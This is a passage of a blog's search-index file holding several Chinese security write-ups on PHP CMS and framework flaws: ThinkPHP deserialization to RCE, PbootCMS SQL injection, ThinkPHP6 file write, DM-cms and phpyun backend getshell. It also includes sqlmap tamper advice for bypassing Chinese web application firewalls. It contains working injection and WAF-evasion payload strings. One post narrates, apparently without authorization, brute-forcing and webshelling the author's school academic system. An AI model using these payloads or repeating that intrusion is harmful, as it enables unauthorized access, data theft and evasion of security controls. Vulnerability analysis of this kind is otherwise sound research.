class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function getData($name &#x3D; null)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($name)) &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125; elseif (array_key_exists($name, $this-&gt;data)) &#123;</span><br><span class="line">        return $this-&gt;data[$name];</span><br><span class="line">    &#125; elseif (array_key_exists($name, $this-&gt;relation)) &#123;</span><br><span class="line">        return $this-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    throw new InvalidArgumentException(&#39;property not exists:&#39; . static::class . &#39;-&gt;&#39; . $name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里，它先判断$name是不是Null如果不是直接返回$this-&gt;data,而这个属性也是可控的。</p><p>回到toArray来，getAttr返回值可控，这就代表我们可以调用任意类的visibale方法，或者寻找__call方法，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$relation &#x3D; $this-&gt;getAttr($key);</span><br><span class="line">$relation-&gt;visible($name);</span><br></pre></td></tr></table></figure><p>最后在Request类内找到了我们想要的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $args)</span><br><span class="line">&#123;</span><br><span class="line">    if (array_key_exists($method, $this-&gt;hook)) &#123;</span><br><span class="line">        array_unshift($args, $this);</span><br><span class="line">        return call_user_func_array($this-&gt;hook[$method], $args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    throw new Exception(&#39;method not exists:&#39; . static::class . &#39;-&gt;&#39; . $method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到一个关键函数call_user_func_array，但是这里我们没有办法直接利用，因为这里的它使用array_unshift把自身这个对象，放到了$args数组的最前面，并且由于$args是一个双重数组，所以没有办法直接利用这里这个点进行命令执行，但是我们可以利用它来调用request类内的任意方法，使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array([$obj,&quot;任意方法&quot;],[$this,任意参数])</span><br><span class="line">也就是</span><br><span class="line">$obj-&gt;$func($this,$argv)</span><br></pre></td></tr></table></figure><p>在request类中有一个filterValue方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">private function filterValue(&amp;$value, $key, $filters)</span><br><span class="line">&#123;</span><br><span class="line">    $default &#x3D; array_pop($filters);</span><br><span class="line"></span><br><span class="line">    foreach ($filters as $filter) &#123;</span><br><span class="line">        if (is_callable($filter)) &#123;</span><br><span class="line">            &#x2F;&#x2F; 调用函数或者方法过滤</span><br><span class="line">            $value &#x3D; call_user_func($filter, $value);</span><br><span class="line">        &#125; elseif (is_scalar($value)) &#123;</span><br><span class="line">            if (false !&#x3D;&#x3D; strpos($filter, &#39;&#x2F;&#39;)) &#123;</span><br><span class="line">                &#x2F;&#x2F; 正则过滤</span><br><span class="line">                if (!preg_match($filter, $value)) &#123;</span><br><span class="line">                    &#x2F;&#x2F; 匹配不成功返回默认值</span><br><span class="line">                    $value &#x3D; $default;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>可以看到此方法内部有一个call_user_func方法，但是$value我们不可控，所以我们查找看看有啥调用了filterValue方法，然后在input内找到了调用filterValue方法，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 解析过滤器</span><br><span class="line">$filter &#x3D; $this-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">if (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</span><br><span class="line">    if (version_compare(PHP_VERSION, &#39;7.1.0&#39;, &#39;&lt;&#39;)) &#123;</span><br><span class="line">        &#x2F;&#x2F; 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span><br><span class="line">        $this-&gt;arrayReset($data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它调用了filterValue方法，但是值依然不可控，可以看到这里还调用了一个getFilter方法跟踪此方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">protected function getFilter($filter, $default)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($filter)) &#123;</span><br><span class="line">        $filter &#x3D; [];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $filter &#x3D; $filter ?: $this-&gt;filter;</span><br><span class="line">        if (is_string($filter) &amp;&amp; false &#x3D;&#x3D;&#x3D; strpos($filter, &#39;&#x2F;&#39;)) &#123;</span><br><span class="line">            $filter &#x3D; explode(&#39;,&#39;, $filter);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $filter &#x3D; (array) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] &#x3D; $default;</span><br><span class="line"></span><br><span class="line">    return $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它是首先判断了值为不为NULL，如果不是，就把$this-&gt;filter赋值给$filter然后return $filter，这正是我们想要的，控制$this-&gt;filter就代表input内$filter可控，</p><p>查找有哪个方法调用了input方法，然后在param方法中找到了调用input方法的，此方法$this-&gt;可以通过get、post方式控制值，但是$name一样不可控，我们查找哪个方法调用了param</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    if (true &#x3D;&#x3D;&#x3D; $name) &#123;</span><br><span class="line">        &#x2F;&#x2F; 获取包含文件上传信息的数组</span><br><span class="line">        $file &#x3D; $this-&gt;file();</span><br><span class="line">        $data &#x3D; is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;</span><br><span class="line"></span><br><span class="line">        return $this-&gt;input($data, &#39;&#39;, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后在isAjax方法内找到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function isAjax($ajax &#x3D; false)</span><br><span class="line">&#123;</span><br><span class="line">    $value  &#x3D; $this-&gt;server(&#39;HTTP_X_REQUESTED_WITH&#39;);</span><br><span class="line">    $result &#x3D; &#39;xmlhttprequest&#39; &#x3D;&#x3D; strtolower($value) ? true : false;</span><br><span class="line"></span><br><span class="line">    if (true &#x3D;&#x3D;&#x3D; $ajax) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result           &#x3D; $this-&gt;param($this-&gt;config[&#39;var_ajax&#39;]) ? true : $result;</span><br><span class="line">    $this-&gt;mergeParam &#x3D; false;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它调用了param方法并且把$ths-&gt;config属性传入进去了，是可控的。</p><p>至此基本利用链思路就有了，我们整理一下</p><p>可控的属性有</p><p>windows</p><p>$files</p><p>Conversion</p><p>$append</p><p>Attribute</p><p>$data</p><p>Request</p><p>$hook<br>$filter<br>$config</p><p>$param</p><p>首先通过windows的__destruct调用removeFiles然后通过removeFiles内的file_exists调用Conversion内的toString方法，toSring调用了toJson，toJson调用了toArray，在toArray内我们通过控制属性$append，以及$data，调用Request的call方法，通过call内的call_user_func_array调用本类的isAjax方法，isAjax调用了param方法，并且通过控制$this-&gt;config[‘var_ajax’]属性，可以控制传入的参数，在param方法内通过GET、POST请求控制$param属性，然后它调用了input方法，在input方法内，首先会通过getData把get、post请求过来的参数取出，之后经过getFilter方法，在这个方法内通过控制$filter属性，可以控制返回值，之后他会调用filterValue方法，并把$filter、$data（经过getData处理后的数据）、$name($this-&gt;config[‘var_ajax’]属性值)，带入进去，之后在filterValue方法内调用了call_user_func函数并把$filter、$data的值传入进去，这两个值都是我们可控最终造成了RCE。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title> PbootCMS—前台首页注入</title>
+      <link href="/2021/01/07/seven/"/>
+      <url>/2021/01/07/seven/</url>
+      
+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><pre><code>个人学习记录</code></pre><h4 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h4><p>搭建好环境后，访问首页</p><p><img src="https://pic.downk.cc/item/5ff6bbd83ffa7d37b3258e87.jpg" alt=""></p><p>poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ext_price%0a)%0aand%0a(updatexml(1,concat(0x3a,&quot;---&quot;,(select%0auser())),1))%23%27</span><br></pre></td></tr></table></figure><p>直接访问</p><p><img src="https://pic.downk.cc/item/5ff6bc113ffa7d37b325cd03.jpg" alt=""></p><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>漏洞入口文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apps&#x2F;home&#x2F;controller&#x2F;IndexController.php</span><br></pre></td></tr></table></figure><p>关键代码在    parserAfter方法内，跟踪进去</p><p><img src="https://pic.downk.cc/item/5ff6bca03ffa7d37b3267476.jpg" alt=""></p><p>进入之后可以看到</p><p>$content = $this-&gt;parserSpecifyListLabel($content);方法</p><p><img src="https://pic.downk.cc/item/5ff6bd5f3ffa7d37b3274646.jpg" alt=""></p><p>进入此方法</p><p>在1115-1118行可以看到，这里接收了GET类型内容，只要前缀是ext_，就会把key值赋值给$where2</p><p>(小注释：get() 是此框架自定义的接受GET类型参数的函数，且有过滤，但是只会过滤数组的value，并不会过滤key)</p><p><img src="https://pic.downk.cc/item/5ff6bdc43ffa7d37b327b973.jpg" alt=""></p><p>之后，我们向下走，</p><p>在1170行，进入到另一个关键方法 getSpecifyList</p><p>跟踪进入</p><p><img src="https://pic.downk.cc/item/5ff6be8b3ffa7d37b328a129.jpg" alt=""></p><p><img src="https://pic.downk.cc/item/5ff6bed33ffa7d37b328fdb6.jpg" alt=""></p><p>关键代码在 第381行，$where 即我们可以控制的内容。可以看到直接带入到了where方法根据where方法</p><p><img src="https://pic.downk.cc/item/5ff6befa3ffa7d37b3292a73.jpg" alt=""></p><p>可以看到直接拼接了sql语句并没有过滤</p><p><img src="https://pic.downk.cc/item/5ff6bf8c3ffa7d37b329dc78.jpg" alt=""></p><h4 id="完"><a href="#完" class="headerlink" title="完"></a>完</h4>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>如何编写自己的绕waf-tamper脚本</title>
+      <link href="/2020/08/25/six/"/>
+      <url>/2020/08/25/six/</url>
+      
+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><pre><code>之前在某个群里，看到有个师傅问云锁怎么绕，后来自己尝试bypass云锁的sql注入由此，有了一下的文章</code></pre><h4 id="过狗篇章"><a href="#过狗篇章" class="headerlink" title="过狗篇章"></a>过狗篇章</h4><p>测试环境：</p><pre><code>wamp(php5.6+mysql5.7+apache)sqli-labs</code></pre><p>搭建好sqli-labs后启动安全狗</p><p><img src="https://i.loli.net/2020/07/20/zS3M8bqVTQ6ZRuJ.png" alt="图片.png"></p><p>ok，之后就是尝试构造绕过语句，安全狗还是挺好过的，我这里使用的换行符号绕过</p><p>直接上payload：union+%0A%23aaa%0Aselect+1,2,3%20%23</p><p><img src="https://i.loli.net/2020/07/20/MX2ldPsCTU1pujw.png" alt="图片.png"></p><p>​    </p><p>成功绕过，然后我们就可以基于此规则写出一个绕过安全狗的sqlmap的tamper</p><p>先直接看成品</p><p><img src="https://i.loli.net/2020/07/20/RyXQBeAEHhSZCVz.png" alt="图片.png"></p><p>进行注入测试</p><p><img src="https://i.loli.net/2020/07/20/u9LfWcbQw5E4xIk.png" alt="图片.png">)<img src="https://i.loli.net/2020/07/20/TA8h1LnQqSpWc43.png" alt="图片.png"></p><p>关于tamper脚本，简单说明下就是，前面的我们不用动，那些基本就是写导入库已经必要的声明之类的，我们只需主要修改的就是tamper函数下面的payload这个变量。想要详细了解tamper编写的师傅可以去看看官方手册。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;payload.replace(&#39;1&#39;,&#39;2&#39;)</span><br></pre></td></tr></table></figure><p>在此代码里，第一个参数输入sql注入的原语句，第二个参数，改为我们绕过形式的语句就ok。</p><p>(小提醒：sqlmap的sql注入语句一般都是为大写，所以在编写的时候注意下大小写问题)</p><h4 id="过盾篇"><a href="#过盾篇" class="headerlink" title="过盾篇"></a>过盾篇</h4><pre><code>环境win server2008+php+sqliab+d_safe_2.1.5.4</code></pre><p><img src="https://i.loli.net/2020/07/21/26wPhrVQ3NIsZuR.png" alt="图片.png"></p><p>运行正常。这里和过狗有些差别，因为d盾他过滤内联注释/<em>*/、/</em>!*/等，并且他也过滤了换行符等一些特殊符号，最后fuzz 出来发现 他只对%A0不敏感。</p><p>先直接上payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php&#x2F;?id&#x3D;1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&#39;union%A0select@1,2,table_name+from+information_schema.TABLES+where+TABLE_SCHEMA+like+database()%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/07/21/ytTFRQ82vBLlUEi.png" alt="图片.png"></p><p>这里说明一下，为什么会填充很多字符，理由就是 如果不填充，你在get类型下就算只输入一个单引号他都会拦截，(离谱)</p><p><img src="https://i.loli.net/2020/07/21/fRP1ABTSezXjiJq.png" alt="图片.png"></p><p>所以需要填充字符来绕过，并且他会拦截=号这里可以用like 代替问题不大</p><p>编写tamper：</p><pre><code>马赛克</code></pre><h4 id="360webscan篇："><a href="#360webscan篇：" class="headerlink" title="360webscan篇："></a>360webscan篇：</h4><p>测试环境：</p><pre><code>wamp+sqliab</code></pre><p><img src="https://i.loli.net/2020/07/21/UPuRNkI8WZDEYsz.png" alt="图片.png"></p><p>搭建成功</p><p>这里我依旧是使用的换行符来进行绕过的，他和d盾一样禁用内联注释，只要出现就被拦，但是规则相比d盾简单些能用的特殊符号多些</p><p>先想payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0Aunion%0Aselect-1,concat_ws(&#39;&#39;,table_name),3 from information_schema.TABLES where TABLE_SCHEMA&#x3D;database()%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/07/21/qED8cPXkgG1n9fa.png" alt="图片.png"></p><p>绕过规则就是在每个函数前面加上%0a、%A0很简单的思路，编写tamper</p><p>先看成品：</p><p><img src="https://i.loli.net/2020/07/21/EZ74GoMmlxFSfta.png" alt="图片.png"></p><p><img src="https://i.loli.net/2020/07/21/jApxrTulP3V7v2N.png" alt="图片.png"></p><p>ok</p><h4 id="过云锁"><a href="#过云锁" class="headerlink" title="过云锁"></a>过云锁</h4><p>测试环境:</p><p>win server 2012+phpstudy+sqliab</p><p>运行正常</p><p><img src="https://i.loli.net/2020/07/22/vWEo2Rz7KLQIMbB.png" alt="图片.png"></p><p>在测试的时候发现，他主要对于联合查询拦截的很敏感，但是相对对于其他的查询类型不怎么严格，</p><p>先上payload来观察：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%26%26(&#96;updatexml&#96;(1,concat(0x3a,&quot;---&quot;,(select user&#x2F;**&#x2F;())),1))%23</span><br><span class="line">&#x2F;&#x2F;bool注入</span><br><span class="line">%7c%7c substr((select user&#x2F;**&#x2F;()),1,1)&#x3D;&quot;r&quot;%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/07/22/ikEgmx3lbfaVZn8.png" alt="图片.png"></p><p><img src="https://i.loli.net/2020/07/22/PgMTK4WFkmRawjQ.png" alt="图片.png"></p><p>所以我们可以针对他盲注和报错注入写tamper ，因为这样比较简单</p><p>成品</p><pre><code>马赛克</code></pre><p>看效果</p><p><img src="https://i.loli.net/2020/07/22/9oK2FODV5Xxr8Nn.png" alt="图片.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><pre><code>waf 绕过，的方式主要还是根据不同waf 拦截的特性来的，根据不同的数据库特性，不同的系统，不同的中间件都有不同的绕过方式这里只是一个抛砖引玉的作用希望师傅们。d盾和云锁没有上tamper是因为，全发出来就没意思了，绕过方式已经给出来，编写就交给师傅们了。</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 技术讨论 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>实战记录</title>
+      <link href="/2020/07/19/five/"/>
+      <url>/2020/07/19/five/</url>
+      
+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe> <p>目标是我的学校一个教务系统。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710205835-10a6ad6c-c2ad-1.png" alt="图片.png"><br>青果的，网上找了找了漏洞，无果。在前期，信息搜集的时候发现开放了8000端口访问看看</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710210120-7346270e-c2ad-1.png" alt="图片.png"></p><p>这熟悉的报错界面 ，该死的甜美，本着某蟑螂(小强)的精神，我fuzz了目录，发现存在一个doc目录</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710210253-aa6f084a-c2ad-1.png" alt="图片.png"><br>没有验证码，仿佛就是告诉你快来淦(爆破)我啊一样<br>掏出burp，爆破，运气还不错。一发入魂（跑出来admin账户）</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710210450-f0028c92-c2ad-1.png" alt="图片.png"><br>但是 进来后发现，这xx管理员的功能少的可怜，连个上传点都没有，注入点也没有<br>后来想了想，既然是教学系统那教师肯定有上传点，因为需要判卷，上传课题，汇报工作等等啥的</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710210742-56f5fa2e-c2ae-1.png" alt="图片.png"><br>有教师用户随便登录一个<br>结果就是不出所料的确实有上传点</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710210823-6f5f6c6c-c2ae-1.png" alt="图片.png"><br>在模板管理处有上传点</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710211111-d3a55498-c2ae-1.png" alt="图片.png"><br>上传测试的时候发现是白名单，但是他除了文件名的时候并不会改名字，最后配合iis6解析漏洞拿下此系统</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710211318-1eea3324-c2af-1.png" alt="图片.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200710211427-483e7db6-c2af-1.png" alt="图片.png"><br>文末（一路上几乎没有什么技术上的坑算是一篇水文，shell已删除）</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>DM-cms后台getshell</title>
+      <link href="/2020/04/28/four/"/>
+      <url>/2020/04/28/four/</url>
+      
+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe>  <p><strong>漏洞触发点</strong></p><p><code>http://www.xxx.cn/admindm-yourname/mod_module/mod_importdata.php?lang=cn</code><br><img src="https://i.loli.net/2020/05/16/xz4tlyAJq5QuBUo.jpg" alt="1.jpg"><br>我们先去模板管理—》模板管理<br><a href="http://www.cc.com/admindm-yourname/mod_style/mod_style.php?lang=cn" target="_blank" rel="noopener">http://www.cc.com/admindm-yourname/mod_style/mod_style.php?lang=cn</a><br><img src="https://i.loli.net/2020/05/16/xmhnpNXOM6Z8Yuj.jpg" alt="2.jpg"><br>点击修改css样式然后插入php代码，然后提交<br><img src="https://i.loli.net/2020/05/16/Cen2BTbdpP5Gh6v.jpg" alt="3.jpg"><br>复制这个路径然后回到，最初的漏洞触发点输入<br><img src="https://i.loli.net/2020/05/16/aTvGNQgXkFBL7o5.jpg" alt="5jpg.jpg"><br>../../DM-static/assets/cssjstpl/style20160721_0855323118.css（之前复制的css文件路径）<br><img src="https://i.loli.net/2020/05/16/6DuvkenH7mlF5cb.jpg" alt="6.jpg"><br>点击提交<br><img src="https://i.loli.net/2020/05/16/52YHhwBM4OkLf96.jpg" alt="11.jpg"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>thinkphp6任意文件写入</title>
+      <link href="/2020/04/03/three/"/>
+      <url>/2020/04/03/three/</url>
+      
+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe>Thinkphp6:任意文件写入<br>版本：v6.0.0-v6.0.1<br>复现过程：<br>下载配置好tp6 然后 ，在\tp6\app\controller\Index.php&nbsp;中。写好，漏洞代码。<br><img src="https://s1.ax1x.com/2020/04/03/GawC8O.png" alt="GawC8O.png" border="0" /><br>然后再去，tp6\app\middleware.php中吧session 写入打开<br><img src="https://s1.ax1x.com/2020/04/03/GawmIP.png" alt="GawmIP.png" border="0" /><br>访问index 控制器,查看<br><img src="https://s1.ax1x.com/2020/04/03/Gaw8qs.png" alt="Gaw8qs.png" border="0" /><br>打开正常，传入a 参数并且抓包<br><img src="https://s1.ax1x.com/2020/04/03/GawUiV.png" alt="GawUiV.png" border="0" /><br>在a参数写入php代码。Phpsessid 写入一个文件名和路径总长度32位的内容。<br>发送<br><img src="https://s1.ax1x.com/2020/04/03/GawcIx.png" alt="GawcIx.png" border="0" /><br>成功写入<br>漏洞分析：<br>根据网上信息漏洞位置在:<br>tp6/vendor/topthink/framework/src/think/session/Store.php<br>所以我们直接定位到漏洞位置：<br><img src="https://s1.ax1x.com/2020/04/03/GawLJf.png" alt="GawLJf.png" border="0" /><br>判断phpsessid的值是否是字符串并且是否长度为32<br>向下走，找到session保存的位置：<br><img src="https://s1.ax1x.com/2020/04/03/Ga09wn.png" alt="Ga09wn.png" border="0" /><br><p>关键代码就是 259-261，这里他判断session的值如果不为空就是进行序列化然后写入.其中也没有过滤。所以如果session 的值 我们能控制 （就比如图1那样），就会直接造成一个任意文件写入的漏洞。</p>（在src/think/middleware/SessionInit.php文件里有phpsessid的获取方法。这里就不追了，有兴趣的可以自己去查看）<br>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>phpyun 后台getshell</title>
+      <link href="/2020/04/02/two/"/>
+      <url>/2020/04/02/two/</url>
+      
+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe><p>漏洞名称：PHPYUN&nbsp;cms后台存在代码执行</br>漏洞版本号： V4.5 Beta</br>漏洞官网：https://www.phpyun.com/</br></p><div>    <p>Poyload:                Url：<br>        http://www.cc.com/admin/index.php?m=database&c=backup        <br>        Post：        pytoken=3c3140b58f5e&table[]=]=1;phpinfo();//&maxfilesize=1111<br>    </p>    复现过程：</br>    漏洞复现过程：<br>首先进入后台-》点击工具-》数据-》数据库管理-》自定义备份-》随便选择一个表-》提交备份<br><img src="https://s1.ax1x.com/2020/04/02/GJHfET.png" alt="GJHfET.png" border="0" /><br>抓包，修改table[] 参数-》发送<br><img src="https://s1.ax1x.com/2020/04/02/GJqEO1.png" alt="GJqEO1.png" border="0" /><br><img src="https://s1.ax1x.com/2020/04/02/GJqtTf.png" alt="GJqtTf.png" border="0" /><br>产生的文件就在uploads/data/plus/bdata/phpyun_20200312153927/config.phpUrl：访问（这里搭建的时候环境，我默认指向了uploads）<br><img src="https://s1.ax1x.com/2020/04/02/GJq600.png" alt="GJq600.png" border="0" /><br>查看文件config.php<br><img src="https://s1.ax1x.com/2020/04/02/GJq5c9.png" alt="GJq5c9.png" border="0" /><br>漏洞审计原因：<br>漏洞产生文件：\phpyun\uploads\admin\model\database.class.php<br>第50行 ：'tablename'=>$_POST['table'] 直接接受了我们post请求发送的参数值<br><img src="https://s1.ax1x.com/2020/04/02/GJLiAf.png" alt="GJLiAf.png" border="0" /><br>然后56行调用了，BackupDatabaseInit() 方法，追踪该函数，<br>在\phpyun\uploads\app\include\dbbackup\class\functions.php，找到了该函数的定义<br><img src="https://s1.ax1x.com/2020/04/02/GJLnun.png" alt="GJLnun.png" border="0" /><br>产生漏洞的原因在<br><img src="https://s1.ax1x.com/2020/04/02/GJLJgJ.png" alt="GJLJgJ.png" border="0" /><br>这里他接收了传入的值并且没有任何过滤就写入了并且是写入的php文件，追踪$d_table 的传入来源可以看到是通过$tablename[$i]拼接 的到的$d_table 的值 追踪$tablename<br><img src="https://s1.ax1x.com/2020/04/02/GJLrCD.png" alt="GJLrCD.png" border="0" /><br>可以看到是通过函数形参传入的$add的tablename 然后赋值的来的<br><img src="https://s1.ax1x.com/2020/04/02/GJLRbt.png" alt="GJLRbt.png" border="0" /><br>在回到\phpyun\uploads\admin\model\database.class.php看，发现tablename 是我们可以控制的，所以传入特定的php代码即可执行<br><img src="https://s1.ax1x.com/2020/04/02/GJLXV0.png" alt="GJLXV0.png" border="0" /><br>漏洞修复：<br>在每次写入config.php文件的时候，在他目录下创建.htaccess文件禁止解析php文件<br><img src="https://s1.ax1x.com/2020/04/02/GJOlqI.png" alt="GJOlqI.png" border="0" /></div>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>闪灵cms重装漏洞复现</title>
+      <link href="/2020/03/27/one/"/>
+      <url>/2020/03/27/one/</url>
+      
